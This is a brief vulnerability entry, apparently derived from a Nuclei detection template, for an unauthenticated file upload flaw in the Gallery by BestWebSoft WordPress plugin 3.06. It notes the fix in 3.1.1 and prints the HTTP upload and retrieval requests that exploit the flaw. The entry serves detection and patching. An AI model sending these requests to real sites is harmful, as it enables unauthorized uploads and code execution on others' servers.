# Vulnerability: WordPress Plugin Gallery 3.06 - Arbitrary File Upload
**Classification:** WP
**Source:** Nuclei Template (`wp-gallery-file-upload.yaml`)

## Description
The Gallery by BestWebSoft WordPress plugin was affected by an Unauthenticated File Upload PHP Code Execution security vulnerability.

## Secure Mitigation
Fixed in version 3.1.1

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-content/plugins/gallery-plugin/upload/php.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=WebKitFormBoundary20kgW2hEKYaeF5iP

--WebKitFormBoundary20kgW2hEKYaeF5iP
Content-Disposition: form-data; name="qqfile"; filename="{{filename}}.png"

{{randstr}}

--WebKitFormBoundary20kgW2hEKYaeF5iP--

GET /wp-content/plugins/gallery-plugin/upload/files/{{filename}}.png HTTP/1.1
Host: {{Hostname}}
```

